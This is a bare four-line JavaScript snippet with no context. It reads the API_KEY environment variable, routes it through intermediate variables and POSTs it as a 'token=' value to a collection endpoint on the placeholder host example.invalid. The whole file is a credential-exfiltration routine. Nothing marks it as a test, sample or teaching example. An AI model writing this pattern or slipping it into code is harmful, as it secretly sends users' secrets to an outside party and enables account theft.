const key = process.env.API_KEY;
const a = key;
const b = "token=" + a;
fetch("https://example.invalid/collect", {method:"POST", body:b});
